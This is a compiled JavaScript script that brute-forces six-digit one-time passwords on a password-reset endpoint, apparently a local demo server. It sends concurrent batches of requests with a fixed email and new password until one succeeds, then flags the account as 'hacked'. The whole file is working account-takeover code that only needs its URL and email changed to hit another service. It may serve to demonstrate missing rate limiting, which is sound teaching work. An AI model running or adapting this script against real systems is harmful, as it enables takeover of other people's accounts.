"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
let hacked = false;
function main(otp) {
    return __awaiter(this, void 0, void 0, function* () {
        let data = JSON.stringify({
            email: "gourav@gmail.com",
            otp,
            newPassword: "123123",
        });
        let config = {
            method: "post",
            maxBodyLength: Infinity,
            url: "http://localhost:3000/reset-password",
            headers: {
                "Content-Type": "application/json",
            },
            data: data,
        };
        try {
            const response = yield axios_1.default.request(config);
            if (response.status === 200)
                hacked = true;
            console.log("Worked for otp: " + otp);
        }
        catch (error) {
            // console.log(error.message + " for otp " + otp);
        }
    });
}
function send() {
    return __awaiter(this, void 0, void 0, function* () {
        let promises = [];
        for (let i = 100000; i < 1000000; i += 100) {
            if (hacked)
                break;
            for (let j = 0; j < 100; j++) {
                promises.push(main(i + j));
            }
            console.log("Promise array length", promises.length);
            yield Promise.all(promises);
            // promises = [];
            console.log(i);
        }
    });
}
send();
// main(543191);
